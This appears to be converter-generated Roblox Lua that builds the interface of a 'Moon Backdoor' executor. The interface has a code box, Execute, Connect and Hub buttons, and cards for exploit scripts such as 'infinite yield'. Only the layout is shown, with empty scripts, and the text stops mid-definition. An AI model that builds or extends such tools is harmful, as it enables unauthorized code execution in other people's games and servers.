--- getgenv().MoonBackdoor:ASync(".S_class")
--- moon






















































--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
]=]

-- Instances: 170 | Scripts: 21 | Modules: 0 | Tags: 0
local G2L = {};

-- StarterGui.ScreenGui
G2L["1"] = Instance.new("ScreenGui", game.CoreGui);
G2L["1"]["IgnoreGuiInset"] = true;
G2L["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
G2L["1"]["ResetOnSpawn"] = false;


-- StarterGui.ScreenGui.Load
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BorderSizePixel"] = 0;
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["2"]["Size"] = UDim2.new(1, 0, 1, 0);
G2L["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2"]["Name"] = [[Load]];
G2L["2"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Load.LocalScript
G2L["3"] = Instance.new("LocalScript", G2L["2"]);



-- StarterGui.ScreenGui.Load.bg
G2L["4"] = Instance.new("ImageLabel", G2L["2"]);
G2L["4"]["ZIndex"] = 10000000;
G2L["4"]["BorderSizePixel"] = 0;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["4"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["4"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["4"]["Image"] = [[rbxassetid://992001116]];
G2L["4"]["Size"] = UDim2.new(1.41, 0, 1, 0);
G2L["4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["BackgroundTransparency"] = 0.4;
G2L["4"]["Name"] = [[bg]];
G2L["4"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.ScreenGui.Load.bg.LocalScript
G2L["5"] = Instance.new("LocalScript", G2L["4"]);



-- StarterGui.ScreenGui.Load.Logo
G2L["6"] = Instance.new("ImageLabel", G2L["2"]);
G2L["6"]["ZIndex"] = 10000000;
G2L["6"]["BorderSizePixel"] = 0;
G2L["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["6"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
G2L["6"]["Image"] = [[rbxassetid://73958241564252]];
G2L["6"]["Size"] = UDim2.new(0, 109, 0, 133);
G2L["6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6"]["BackgroundTransparency"] = 0.4;
G2L["6"]["Name"] = [[Logo]];
G2L["6"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.ScreenGui.Load.Logo.LocalScript
G2L["7"] = Instance.new("LocalScript", G2L["6"]);



-- StarterGui.ScreenGui.Load.Logo.UIAspectRatioConstraint
G2L["8"] = Instance.new("UIAspectRatioConstraint", G2L["6"]);



-- StarterGui.ScreenGui.Load.Logo.UICorner
G2L["9"] = Instance.new("UICorner", G2L["6"]);
G2L["9"]["CornerRadius"] = UDim.new(1, 0);


-- StarterGui.ScreenGui.Main
G2L["a"] = Instance.new("Frame", G2L["1"]);
G2L["a"]["Visible"] = false;
G2L["a"]["ZIndex"] = 1000000000;
G2L["a"]["BorderSizePixel"] = 0;
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["a"]["Size"] = UDim2.new(0, 555, 0, 328);
G2L["a"]["Position"] = UDim2.new(0.23167, 0, 0.2484, 0);
G2L["a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a"]["Name"] = [[Main]];


-- StarterGui.ScreenGui.Main.UIDrag
G2L["b"] = Instance.new("LocalScript", G2L["a"]);
G2L["b"]["Name"] = [[UIDrag]];


-- StarterGui.ScreenGui.Main.LocalScript
G2L["c"] = Instance.new("LocalScript", G2L["a"]);



-- StarterGui.ScreenGui.Main.LocalScript
G2L["d"] = Instance.new("LocalScript", G2L["a"]);



-- StarterGui.ScreenGui.Main.bg
G2L["e"] = Instance.new("ImageLabel", G2L["a"]);
G2L["e"]["ZIndex"] = 1000000000;
G2L["e"]["BorderSizePixel"] = 0;
G2L["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["e"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["e"]["Image"] = [[rbxassetid://992001116]];
G2L["e"]["Size"] = UDim2.new(0, 555, 0, 328);
G2L["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e"]["BackgroundTransparency"] = 1;
G2L["e"]["Name"] = [[bg]];
G2L["e"]["Position"] = UDim2.new(0, 0, 0, 0);


-- StarterGui.ScreenGui.Main.bg.UICorner
G2L["f"] = Instance.new("UICorner", G2L["e"]);
G2L["f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.CodeBar
G2L["10"] = Instance.new("TextBox", G2L["a"]);
G2L["10"]["Name"] = [[CodeBar]];
G2L["10"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["10"]["ZIndex"] = 1000000000;
G2L["10"]["BorderSizePixel"] = 0;
G2L["10"]["TextWrapped"] = true;
G2L["10"]["TextSize"] = 17;
G2L["10"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["10"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["10"]["BackgroundColor3"] = Color3.fromRGB(3, 3, 3);
G2L["10"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["10"]["MultiLine"] = true;
G2L["10"]["ClearTextOnFocus"] = false;
G2L["10"]["PlaceholderText"] = [[print(" Moon Backdoor")]];
G2L["10"]["Size"] = UDim2.new(0, 506, 0, 212);
G2L["10"]["Position"] = UDim2.new(0.04237, 0, 0.14512, 0);
G2L["10"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["10"]["Text"] = [[]];


-- StarterGui.ScreenGui.Main.CodeBar.UICorner
G2L["11"] = Instance.new("UICorner", G2L["10"]);
G2L["11"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Buttons
G2L["12"] = Instance.new("Frame", G2L["a"]);
G2L["12"]["ZIndex"] = 1000000000;
G2L["12"]["BorderSizePixel"] = 0;
G2L["12"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["12"]["Size"] = UDim2.new(0, 506, 0, 43);
G2L["12"]["Position"] = UDim2.new(0.04237, 0, 0.82555, 0);
G2L["12"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["12"]["Name"] = [[Buttons]];
G2L["12"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Main.Buttons.UIListLayout
G2L["13"] = Instance.new("UIListLayout", G2L["12"]);
G2L["13"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["13"]["Padding"] = UDim.new(0, 19);
G2L["13"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
G2L["13"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["13"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.ScreenGui.Main.Buttons.Exe
G2L["14"] = Instance.new("TextButton", G2L["12"]);
G2L["14"]["BorderSizePixel"] = 0;
G2L["14"]["TextSize"] = 29;
G2L["14"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["14"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["14"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["14"]["ZIndex"] = 1000000000;
G2L["14"]["Size"] = UDim2.new(0, 243, 0, 38);
G2L["14"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["14"]["Text"] = [[Execute]];
G2L["14"]["Name"] = [[Exe]];
G2L["14"]["Position"] = UDim2.new(0.07609, 0, 0.05814, 0);


-- StarterGui.ScreenGui.Main.Buttons.Exe.UICorner
G2L["15"] = Instance.new("UICorner", G2L["14"]);
G2L["15"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Buttons.Clear
G2L["16"] = Instance.new("TextButton", G2L["12"]);
G2L["16"]["BorderSizePixel"] = 0;
G2L["16"]["TextSize"] = 29;
G2L["16"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["16"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["16"]["ZIndex"] = 1000000000;
G2L["16"]["Size"] = UDim2.new(0, 243, 0, 38);
G2L["16"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["16"]["Text"] = [[clear]];
G2L["16"]["Name"] = [[Clear]];
G2L["16"]["Position"] = UDim2.new(0.60236, 0, 0.05814, 0);


-- StarterGui.ScreenGui.Main.Buttons.Clear.UICorner
G2L["17"] = Instance.new("UICorner", G2L["16"]);
G2L["17"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Name
G2L["18"] = Instance.new("TextLabel", G2L["a"]);
G2L["18"]["ZIndex"] = 1000000000;
G2L["18"]["BorderSizePixel"] = 0;
G2L["18"]["TextSize"] = 36;
G2L["18"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["18"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["18"]["BackgroundTransparency"] = 1;
G2L["18"]["Size"] = UDim2.new(0, 235, 0, 52);
G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["18"]["Text"] = [[Moon Backdoor]];
G2L["18"]["Name"] = [[Name]];
G2L["18"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Logo
G2L["19"] = Instance.new("ImageLabel", G2L["a"]);
G2L["19"]["ZIndex"] = 1000000000;
G2L["19"]["BorderSizePixel"] = 0;
G2L["19"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["19"]["Image"] = [[rbxassetid://73958241564252]];
G2L["19"]["Size"] = UDim2.new(0, 38, 0, 34);
G2L["19"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["19"]["BackgroundTransparency"] = 1;
G2L["19"]["Name"] = [[Logo]];
G2L["19"]["Position"] = UDim2.new(0.04237, 0, 0.0258, 0);


-- StarterGui.ScreenGui.Main.Logo.UIAspectRatioConstraint
G2L["1a"] = Instance.new("UIAspectRatioConstraint", G2L["19"]);



-- StarterGui.ScreenGui.Main.Stats
G2L["1b"] = Instance.new("TextLabel", G2L["a"]);
G2L["1b"]["ZIndex"] = 1000000000;
G2L["1b"]["BorderSizePixel"] = 0;
G2L["1b"]["TextSize"] = 20;
G2L["1b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1b"]["BackgroundTransparency"] = 1;
G2L["1b"]["Size"] = UDim2.new(0, 58, 0, 52);
G2L["1b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1b"]["Text"] = [[🔴]];
G2L["1b"]["Name"] = [[Stats]];
G2L["1b"]["Position"] = UDim2.new(0.89407, 0, 0, 0);


-- StarterGui.ScreenGui.Main.Stats.UIAspectRatioConstraint
G2L["1c"] = Instance.new("UIAspectRatioConstraint", G2L["1b"]);



-- StarterGui.ScreenGui.Main.Connect
G2L["1d"] = Instance.new("TextButton", G2L["a"]);
G2L["1d"]["BorderSizePixel"] = 0;
G2L["1d"]["TextSize"] = 20;
G2L["1d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["1d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["1d"]["ZIndex"] = 1000000000;
G2L["1d"]["Size"] = UDim2.new(0.03105, 98, 0.01352, 22);
G2L["1d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["1d"]["Text"] = [[Connect]];
G2L["1d"]["Name"] = [[Connect]];
G2L["1d"]["Position"] = UDim2.new(0.69522, 0, 0.03894, 0);


-- StarterGui.ScreenGui.Main.Connect.UICorner
G2L["1e"] = Instance.new("UICorner", G2L["1d"]);
G2L["1e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.UICorner
G2L["1f"] = Instance.new("UICorner", G2L["a"]);
G2L["1f"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Main.Hub
G2L["20"] = Instance.new("TextButton", G2L["a"]);
G2L["20"]["BorderSizePixel"] = 0;
G2L["20"]["TextSize"] = 20;
G2L["20"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["20"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["20"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["20"]["ZIndex"] = 1000000000;
G2L["20"]["Size"] = UDim2.new(-0.01895, 98, 0.01352, 22);
G2L["20"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["20"]["Text"] = [[Hub]];
G2L["20"]["Name"] = [[Hub]];
G2L["20"]["Position"] = UDim2.new(0.51522, 0, 0.03894, 0);


-- StarterGui.ScreenGui.Main.Hub.LocalScript
G2L["21"] = Instance.new("LocalScript", G2L["20"]);



-- StarterGui.ScreenGui.Main.Hub.UICorner
G2L["22"] = Instance.new("UICorner", G2L["20"]);
G2L["22"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub
G2L["23"] = Instance.new("Frame", G2L["1"]);
G2L["23"]["Visible"] = false;
G2L["23"]["ZIndex"] = 1000000000;
G2L["23"]["BorderSizePixel"] = 0;
G2L["23"]["BackgroundColor3"] = Color3.fromRGB(92, 7, 123);
G2L["23"]["Size"] = UDim2.new(0, 555, 0, 328);
G2L["23"]["Position"] = UDim2.new(0.23167, 0, 0.2484, 0);
G2L["23"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["23"]["Name"] = [[Hub]];


-- StarterGui.ScreenGui.Hub.UIDrag
G2L["24"] = Instance.new("LocalScript", G2L["23"]);
G2L["24"]["Name"] = [[UIDrag]];


-- StarterGui.ScreenGui.Hub.bg
G2L["25"] = Instance.new("ImageLabel", G2L["23"]);
G2L["25"]["ZIndex"] = 1000000000;
G2L["25"]["BorderSizePixel"] = 0;
G2L["25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["25"]["ImageTransparency"] = 0.4;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["25"]["ImageColor3"] = Color3.fromRGB(129, 0, 255);
G2L["25"]["Image"] = [[rbxassetid://992001116]];
G2L["25"]["Size"] = UDim2.new(0, 555, 0, 328);
G2L["25"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["25"]["BackgroundTransparency"] = 1;
G2L["25"]["Name"] = [[bg]];
G2L["25"]["Position"] = UDim2.new(0, 0, 0, 0);


-- StarterGui.ScreenGui.Hub.bg.UICorner
G2L["26"] = Instance.new("UICorner", G2L["25"]);
G2L["26"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.Name
G2L["27"] = Instance.new("TextLabel", G2L["23"]);
G2L["27"]["ZIndex"] = 1000000000;
G2L["27"]["BorderSizePixel"] = 0;
G2L["27"]["TextSize"] = 36;
G2L["27"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["27"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["27"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["27"]["BackgroundTransparency"] = 1;
G2L["27"]["Size"] = UDim2.new(0, 235, 0, 52);
G2L["27"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["27"]["Text"] = [[Moon Backdoor Hub!]];
G2L["27"]["Name"] = [[Name]];
G2L["27"]["Position"] = UDim2.new(0.13347, 0, 0, 0);


-- StarterGui.ScreenGui.Hub.Logo
G2L["28"] = Instance.new("ImageLabel", G2L["23"]);
G2L["28"]["ZIndex"] = 1000000000;
G2L["28"]["BorderSizePixel"] = 0;
G2L["28"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["28"]["Image"] = [[rbxassetid://73958241564252]];
G2L["28"]["Size"] = UDim2.new(0, 38, 0, 34);
G2L["28"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["28"]["BackgroundTransparency"] = 1;
G2L["28"]["Name"] = [[Logo]];
G2L["28"]["Position"] = UDim2.new(0.04237, 0, 0.0258, 0);


-- StarterGui.ScreenGui.Hub.Logo.UIAspectRatioConstraint
G2L["29"] = Instance.new("UIAspectRatioConstraint", G2L["28"]);



-- StarterGui.ScreenGui.Hub.Hub
G2L["2a"] = Instance.new("TextButton", G2L["23"]);
G2L["2a"]["BorderSizePixel"] = 0;
G2L["2a"]["TextSize"] = 20;
G2L["2a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2a"]["BackgroundColor3"] = Color3.fromRGB(69, 3, 113);
G2L["2a"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["2a"]["ZIndex"] = 1000000000;
G2L["2a"]["Size"] = UDim2.new(-0.01895, 98, 0.01352, 22);
G2L["2a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2a"]["Text"] = [[Exe]];
G2L["2a"]["Name"] = [[Hub]];
G2L["2a"]["Position"] = UDim2.new(0.79522, 0, 0.03894, 0);


-- StarterGui.ScreenGui.Hub.Hub.LocalScript
G2L["2b"] = Instance.new("LocalScript", G2L["2a"]);



-- StarterGui.ScreenGui.Hub.Hub.UICorner
G2L["2c"] = Instance.new("UICorner", G2L["2a"]);
G2L["2c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame
G2L["2d"] = Instance.new("ScrollingFrame", G2L["23"]);
G2L["2d"]["Active"] = true;
G2L["2d"]["ZIndex"] = 1000000000;
G2L["2d"]["BorderSizePixel"] = 0;
G2L["2d"]["CanvasSize"] = UDim2.new(0, 0, 5, 0);
G2L["2d"]["CanvasPosition"] = Vector2.new(0, 536.66663);
G2L["2d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2d"]["Size"] = UDim2.new(-0.01, 505, 0, 259);
G2L["2d"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["Position"] = UDim2.new(0.05144, 0, 0.15854, 0);
G2L["2d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["2d"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.UIPadding
G2L["2e"] = Instance.new("UIPadding", G2L["2d"]);
G2L["2e"]["PaddingTop"] = UDim.new(0, 5);
G2L["2e"]["PaddingLeft"] = UDim.new(0, 8);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.UIListLayout
G2L["2f"] = Instance.new("UIListLayout", G2L["2d"]);
G2L["2f"]["Wraps"] = true;
G2L["2f"]["Padding"] = UDim.new(0, 6);
G2L["2f"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["2f"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["30"] = Instance.new("Frame", G2L["2d"]);
G2L["30"]["BorderSizePixel"] = 0;
G2L["30"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["30"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["30"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["30"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["31"] = Instance.new("UIStroke", G2L["30"]);
G2L["31"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["31"]["Thickness"] = 1.3;
G2L["31"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["32"] = Instance.new("ImageLabel", G2L["30"]);
G2L["32"]["BorderSizePixel"] = 0;
G2L["32"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["32"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["32"]["Image"] = [[rbxassetid://114500437382056]];
G2L["32"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["32"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["32"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["33"] = Instance.new("UICorner", G2L["32"]);
G2L["33"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["34"] = Instance.new("UIGradient", G2L["32"]);
G2L["34"]["Rotation"] = 90;
G2L["34"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["35"] = Instance.new("TextButton", G2L["30"]);
G2L["35"]["BorderSizePixel"] = 0;
G2L["35"]["TextSize"] = 22;
G2L["35"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["35"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Text"] = [[Execute]];
G2L["35"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["36"] = Instance.new("LocalScript", G2L["35"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["37"] = Instance.new("UICorner", G2L["35"]);
G2L["37"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["38"] = Instance.new("UICorner", G2L["30"]);
G2L["38"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["39"] = Instance.new("TextLabel", G2L["30"]);
G2L["39"]["BorderSizePixel"] = 0;
G2L["39"]["TextSize"] = 32;
G2L["39"]["TextTransparency"] = 0.49;
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["39"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["BackgroundTransparency"] = 1;
G2L["39"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["Text"] = [[Goner]];
G2L["39"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["3a"] = Instance.new("Frame", G2L["2d"]);
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["3a"]["Size"] = UDim2.new(0, 155, 0, 176);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Name"] = [[Just]];


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UIStroke
G2L["3b"] = Instance.new("UIStroke", G2L["3a"]);
G2L["3b"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["3b"]["Thickness"] = 1.3;
G2L["3b"]["Color"] = Color3.fromRGB(86, 3, 147);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel
G2L["3c"] = Instance.new("ImageLabel", G2L["3a"]);
G2L["3c"]["BorderSizePixel"] = 0;
G2L["3c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3c"]["ImageTransparency"] = 0.37;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
G2L["3c"]["Image"] = [[rbxassetid://72792773278885]];
G2L["3c"]["Size"] = UDim2.new(0, 155, 0, 141);
G2L["3c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3c"]["BackgroundTransparency"] = 1;


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UICorner
G2L["3d"] = Instance.new("UICorner", G2L["3c"]);
G2L["3d"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.ImageLabel.UIGradient
G2L["3e"] = Instance.new("UIGradient", G2L["3c"]);
G2L["3e"]["Rotation"] = 90;
G2L["3e"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(1.000, 1)};


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton
G2L["3f"] = Instance.new("TextButton", G2L["3a"]);
G2L["3f"]["BorderSizePixel"] = 0;
G2L["3f"]["TextSize"] = 22;
G2L["3f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(86, 3, 147);
G2L["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3f"]["Size"] = UDim2.new(0.03, 121, 0.03, 24);
G2L["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["Text"] = [[Execute]];
G2L["3f"]["Position"] = UDim2.new(0.09032, 0, 0.77114, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
G2L["40"] = Instance.new("LocalScript", G2L["3f"]);



-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.UICorner
G2L["41"] = Instance.new("UICorner", G2L["3f"]);
G2L["41"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.UICorner
G2L["42"] = Instance.new("UICorner", G2L["3a"]);
G2L["42"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextLabel
G2L["43"] = Instance.new("TextLabel", G2L["3a"]);
G2L["43"]["BorderSizePixel"] = 0;
G2L["43"]["TextSize"] = 32;
G2L["43"]["TextTransparency"] = 0.49;
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["43"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["43"]["BackgroundTransparency"] = 1;
G2L["43"]["Size"] = UDim2.new(0, 115, 0, 21);
G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["43"]["Text"] = [[infinte yield]];
G2L["43"]["Position"] = UDim2.new(0.12, 0, 0.06477, 0);


-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just
G2L["44"] = Instance.new("Frame", G2L["2d"]);
G2L["44"]["BorderSizePixel"] = 0;
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(55, 3, 84);
G2L["44"]["Size"] = UDim2.new(0, 155, 0, 176);
